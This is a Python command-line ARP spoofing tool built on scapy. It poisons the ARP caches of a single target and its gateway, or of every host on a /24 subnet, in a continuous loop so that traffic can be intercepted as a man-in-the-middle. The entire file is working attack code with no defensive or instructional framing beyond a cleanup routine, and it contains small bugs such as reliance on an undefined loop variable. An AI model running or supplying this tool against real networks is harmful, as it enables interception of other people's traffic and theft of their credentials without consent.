#!/usr/bin/python3

import argparse
import os
import sys
import time
import socket
import threading

try:
    import scapy.all as scapy
except Exception as e:
    sys.exit("ERROR: Module missing: scapy. Install with > pip install scapy <")


class colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    WHITE = '\033[97m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'


def arp_spoof(targetIP1, targetIP2, targetALL):
    info = ""
    if targetALL == 1:
        info = "ALL"
    else:
        info = "False"
        
    print("""
—————————————————————————————————
    """)
    print("  Gateway : ", targetIP2)
    print("  Target  : ", targetIP1)
    print("  Subnet  : ", info)

    print("""
—————————————————————————————————    
    """)

    def get_mac(ip):
        arpRequest = scapy.ARP(pdst = ip)
        broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
        arpRequestBroadcast = broadcast / arpRequest
        answeredList = scapy.srp(arpRequestBroadcast, timeout = 5, verbose = False)[0]
        return answeredList[0][1].hwsrc

    def spoof(targetIP, spoofIP):
        packet = scapy.ARP(op = 2, pdst = targetIP, hwdst = get_mac(targetIP), psrc = spoofIP)
        scapy.send(packet, verbose = False)

    def restore(destination_ip, source_ip):
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
        packet = scapy.ARP(op = 2, pdst = destination_ip,
                                hwdst = destination_mac,
                    psrc = source_ip, hwsrc = source_mac)
        scapy.send(packet, verbose = False)
        
    packetCount = 1
    h_name = socket.gethostname()
    addr = socket.gethostbyname(h_name)    
    
    def send_subnet(targetIP1, targetIP2, packetCount):
        modified_IP = str(targetIP2)[:-1]
        targetIP1 = modified_IP + str(i)
        if targetIP1 == addr:
            pass
        else:
            
            try:
                spoof(targetIP1, targetIP2)
                spoof(targetIP2, targetIP1)
                print(f'spoofed target gateway ::[{targetIP2}] >> sent spoofed packet [{packetCount}] to {targetIP1}') 
            except KeyboardInterrupt:
                sys.exit()
            except Exception as e:
                print(colors.RED, "ERROR: Target unreachable : ", targetIP1, colors.WHITE, end="\r")        
    
    try:
        print("processing attack...")
        while True:
            if targetALL == 0:
                spoof(targetIP1, targetIP2)
                spoof(targetIP2, targetIP1)
                print(f'spoofed target gateway ::[{targetIP2}] >> sent spoofed packet [{packetCount}] to {targetIP1}')               
            else:
                for i in range(2, 254):
                    thread = threading.Thread(target=send_subnet, args=(targetIP1,targetIP2,packetCount))
                    thread.start()

            packetCount += 1
            time.sleep(2)
    except KeyboardInterrupt:
        if targetALL == 0:
            print('Keyboard-Interrupt detected.\r\n >> cleaning up arp-tables.')
            restore(targetIP1, targetIP1)
            print(f' >> restoring OG-MAC from {targetIP2}')
            restore(targetIP1, targetIP2)
            print(f' >> restoring OG-MAC from {targetIP1}')
        else:
            print('Keyboard-Interrupt detected.\r\n >> waiting for threads to close.')
        sys.exit()
        
def main():
    parser = argparse.ArgumentParser(description="ARP-spoofer version 1.0.3")
    parser.add_argument("gateway", help="specify the gateway ip address")
    parser.add_argument("-t", dest="target", help="specify the target ip address")
    parser.add_argument("-all", action="store_true", help="spoofs all subnet ip addresses")
    args = parser.parse_args()
    
    if args.target:
        arp_spoof(args.target, args.gateway, 0)
    
    elif args.all:
        arp_spoof("not specified", args.gateway, 1)
    
    else:
        sys.exit("ERROR: Missing arguments.")
        
if __name__ in "__main__":
    main()
